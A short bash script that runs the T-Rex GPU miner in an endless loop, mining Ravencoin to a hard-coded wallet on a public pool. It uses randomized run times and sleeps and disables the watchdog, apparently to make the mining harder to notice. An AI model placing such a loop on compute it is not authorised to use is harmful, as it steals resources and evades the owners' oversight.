while:
do
	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%150))
	b=240
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=120
	aaram=$(($w+$e))
	timeout -k 5 $c\s  ./t-rex -a kawpow -o stratum+tcp://rvn.cruxpool.com:9999   -u  RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc --no-watchdog 
	sleep $aaram
done
